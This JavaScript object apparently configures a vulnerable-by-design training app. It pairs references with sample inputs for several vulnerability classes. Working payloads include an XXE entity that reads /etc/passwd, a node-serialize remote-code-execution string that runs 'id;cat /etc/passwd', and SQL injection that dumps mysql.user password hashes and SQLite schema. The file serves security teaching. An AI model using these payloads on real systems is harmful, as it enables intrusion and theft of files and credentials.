let hacks = {
    xmlparser: {
        hackref: "https://portswigger.net/web-security/xxe",
        //hackref: "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
        devref: "https://www.npmjs.com/package/libxmljs",
        genref: "https://xmlwriter.net/xml_guide/entity_declaration.shtml",
        //genref: "https://www.w3schools.com/xml/xml_dtd_intro.asp",
        config: `noent=true&noblanks=true`,
        sample:
            `<!DOCTYPE foo [<!ELEMENT foo ANY >\n` +
            `<!ENTITY bar SYSTEM "file:///etc/passwd" >]>\n` +
            `<products>\n` +
            `  <product> <name>PS3</name> <description>&bar;</description> </product>\n` +
            `  <product> <name>PS4</name> <description>Gaming Console</description> </product>\n` +
            `</products>`,
    },
    jsondeser: {
        hackref:
            "https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/",
        devref: "https://www.npmjs.com/package/node-serialize",
        genref:
            "https://github.com/appsecco/dvna/blob/master/docs/solution/a8-insecure-deserialization.md",
        //owasp: "",
        sample:
            `{` +
            `"msg":"See server log for RCE :-)",\n` +
            `"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id;cat /etc/passwd', function(error, stdout, stderr) { console.log(stdout) });}()"` +
            `}`,
        config: ``,
    },
    ldapsearch: {
        hackref:
            "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection.html",
        devref: "http://ldapjs.org/client.html#search",
        genref: "https://ldapwiki.com/wiki/LDAP%20Query%20Examples",
        sample2:
            `{\n` +
            `  "bind":{"dn":"uid=tesla,dc=example,dc=com","password":"password"},\n` +
            `  "search":{"base":"dc=example,dc=com", "options":{"scope":"sub"}},\n` +
            `  "serverinfo":"https://www.forumsys.com/tutorials/integration-how-to/ldap/online-ldap-test-server/"\n` +
            `}`,
        sample: `{
    "bind":{"dn":"cn=admin,dc=testorg,dc=com","password":"admin"},
    "search":{
        "base":"dc=testorg,dc=com", 
        "options":{
            "scope":"sub",
            "filter": "(&(uid=fred)(sn=mack))"
        }
    }
}`,
        config2: `url=ldap://ldap.forumsys.com:389&timeout=3000&connectTimeout=3000`,
        config: `url=ldap://127.0.0.1:389&timeout=3000&connectTimeout=3000`,
    },
    mathjs: {
        hackref:
            "https://github.com/appsecco/dvna/blob/master/docs/solution/a9-using-components-with-known-vulnerability.md",
        devref: "https://mathjs.org/docs/expressions/parsing.html",
        genref: "https://mathjs.org/docs/expressions/parsing.html",
        sample: "",
        config: "",
    },
    mysql: {
        hackref: "https://portswigger.net/web-security/sql-injection/cheat-sheet",
        devref: "https://www.npmjs.com/package/mysql",
        genref: "https://mariadb.com/kb/en/select/",
        sample:
            `SELECT "information_schema.tables" as "table", table_schema,table_name,table_type FROM information_schema.tables UNION\n` +
            `SELECT "mysql.user", host,user,password from mysql.user;`,
        config: `host=localhost&user=tester&database=mysql&password=Passw0rd123`,
    },
    sqlite: {
        hackref:
            "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md",
        devref: "https://www.npmjs.com/package/sqlite3",
        genref: "https://www.sqlitetutorial.net",
        sample:
            `select "NORMAL_DATA" as "INPUT",Name,ArtistId,"" as Extra from artists where Name like "AC/%" and 1=1 UNION\n` +
            `select "SQLITE_VERSION", sqlite_version(),"","" UNION\n` +
            `select "SQLITE_DATE", datetime('now','localtime'),"","" UNION\n` +
            `select "SQLITE_TABLE",name,tbl_name,type from sqlite_master where type="table";\n\n` +
            `pragma module_list;\npragma database_list;\npragma function_list;`,
        config: `dbFile=/app/data/chinook.db`,
    },
};
